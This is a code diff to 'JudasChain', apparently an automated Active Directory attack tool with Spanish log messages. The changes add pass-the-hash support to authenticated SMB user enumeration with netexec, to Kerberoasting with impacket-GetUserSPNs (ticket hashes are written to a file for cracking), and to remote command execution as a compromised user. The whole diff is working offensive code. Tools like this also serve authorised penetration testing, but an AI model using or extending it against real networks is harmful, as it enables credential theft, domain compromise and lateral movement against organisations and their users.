@@ -429,15 +429,26 @@ class JudasChain:
         creds = ctx.best_creds()
         if not users_found and creds:
             u = creds[0]
-            p = creds[1]
-            if p is not None:
+            p = creds[1] if len(creds) <= 2 else None
+            nt = creds[2] if len(creds) > 2 else None
+            if p and p.startswith("HASH:"):
+                nt = p[5:]
+                p = None
+            if p is not None or nt is not None:
                 log_step(f"Enumeración autenticada como {u}...")
-                qu, qp = shlex.quote(u), shlex.quote(p)
-                out3, _, _ = self.r.run(
-                    f"netexec smb {ctx.dc_ip} -u {qu} -p {qp} "
-                    f"-d {shlex.quote(ctx.domain)} --users 2>/dev/null",
-                    timeout=60
-                )
+                qu = shlex.quote(u)
+                if nt:
+                    out3, _, _ = self.r.run(
+                        f"netexec smb {ctx.dc_ip} -u {qu} -H {shlex.quote(nt)} "
+                        f"-d {shlex.quote(ctx.domain)} --users 2>/dev/null",
+                        timeout=60
+                    )
+                else:
+                    out3, _, _ = self.r.run(
+                        f"netexec smb {ctx.dc_ip} -u {qu} -p {shlex.quote(p)} "
+                        f"-d {shlex.quote(ctx.domain)} --users 2>/dev/null",
+                        timeout=60
+                    )
                 users_found += parse_netexec_users(out3)
 
         if users_found:
@@ -493,21 +504,38 @@ class JudasChain:
     def phase_kerberoast(self) -> None:
         ctx = self.ctx
         creds = ctx.best_creds()
-        if not creds or creds[1] is None:
+        if not creds:
+            log_warn("Sin credenciales — saltando Kerberoasting")
+            return
+
+        u = creds[0]
+        p = creds[1] if len(creds) <= 2 else None
+        nthash = creds[2] if len(creds) > 2 else None
+        if p and p.startswith("HASH:"):
+            nthash = p[5:]
+            p = None
+        if p is None and nthash is None:
             log_warn("Sin credenciales de contraseña — saltando Kerberoasting")
             return
 
         log_phase("FASE 4 — KERBEROASTING")
-        u, p = creds[0], creds[1]
         hashfile = f"{ctx.output_dir}/kerb_hashes.txt"
+        qu = shlex.quote(u)
 
         log_step(f"Solicitando TGS para cuentas con SPN ({u})...")
-        qu, qp = shlex.quote(u), shlex.quote(p)
-        out, _, _ = self.r.run(
-            f"impacket-GetUserSPNs {shlex.quote(ctx.domain)}/{qu}:{qp} "
-            f"-dc-ip {ctx.dc_ip} -request -outputfile {shlex.quote(hashfile)}",
-            timeout=60
-        )
+        if nthash:
+            out, _, _ = self.r.run(
+                f"impacket-GetUserSPNs {shlex.quote(ctx.domain)}/{qu} -hashes :{shlex.quote(nthash)} "
+                f"-dc-ip {ctx.dc_ip} -request -outputfile {shlex.quote(hashfile)}",
+                timeout=60
+            )
+        else:
+            qp = shlex.quote(p)
+            out, _, _ = self.r.run(
+                f"impacket-GetUserSPNs {shlex.quote(ctx.domain)}/{qu}:{qp} "
+                f"-dc-ip {ctx.dc_ip} -request -outputfile {shlex.quote(hashfile)}",
+                timeout=60
+            )
 
         if Path(hashfile).exists():
             for line in Path(hashfile).read_text().splitlines():
@@ -682,6 +710,9 @@ class JudasChain:
         user = creds[0]
         nthash = creds[2] if len(creds) > 2 else None
         password = creds[1] if not nthash else None
+        if password and password.startswith("HASH:"):
+            nthash = password[5:]
+            password = None
         log_info(f"Ejecutando como {user} {'(PTH)' if nthash else ''} vía netexec")
 
         def remote(cmd: str) -> str:
